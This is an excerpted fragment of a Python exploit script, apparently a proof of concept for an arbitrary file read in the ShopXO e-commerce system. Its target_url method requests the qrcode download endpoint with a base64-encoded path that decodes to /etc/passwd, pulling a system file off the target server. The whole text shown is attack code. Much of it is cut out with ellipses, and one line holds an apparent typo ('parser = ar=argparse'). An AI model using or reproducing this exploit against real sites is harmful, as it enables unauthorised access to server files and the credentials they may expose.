...
class information(object):
    ...
    def target_url(self):
        target_url = self.url + "/public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q="
        headers = {
...
if __name__ == "__main__":
    title()
    parser = ar=argparse.ArgumentParser(description='ShopXO企业级B2C电商系统任意文件读取')
